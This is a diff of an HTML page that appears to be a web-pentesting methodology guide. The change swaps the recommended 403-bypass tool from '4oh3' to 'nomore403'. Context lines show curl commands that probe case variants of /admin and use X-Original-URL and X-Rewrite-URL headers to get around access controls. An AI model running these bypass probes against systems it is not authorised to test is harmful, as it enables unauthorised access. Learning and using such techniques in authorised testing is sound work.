@@ -106,9 +106,9 @@
 </span></span><span class=line><span class=cl>curl -sI <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/Admin&#34;</span>      <span class=c1>## case-sensitivity on Linux backends</span>
 </span></span><span class=line><span class=cl>curl -sI <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/ADMIN&#34;</span>
 </span></span></code></pre></div><h3 id=403-bypass-attempts data-heading-permalink=true><span class=heading-content>403 bypass attempts</span>
-<a class=heading-permalink href=#403-bypass-attempts aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>When you find an interesting endpoint that returns 403, try <a href=https://github.com/jinpwn/4oh3 target=_blank rel="noopener noreferrer">4oh3</a>
+<a class=heading-permalink href=#403-bypass-attempts aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>When you find an interesting endpoint that returns 403, try <a href=https://github.com/devploit/nomore403 target=_blank rel="noopener noreferrer">nomore403</a>
 or <a href=https://github.com/iamj0ker/bypass-403 target=_blank rel="noopener noreferrer">bypass-403</a>
-:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>4oh3 -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/admin&#34;</span>
+:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nomore403 -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/admin&#34;</span>
 </span></span><span class=line><span class=cl><span class=c1>## Header tricks:</span>
 </span></span><span class=line><span class=cl>curl -H <span class=s2>&#34;X-Original-URL: /admin&#34;</span> <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/&#34;</span>
 </span></span><span class=line><span class=cl>curl -H <span class=s2>&#34;X-Rewrite-URL: /admin&#34;</span> <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/&#34;</span>
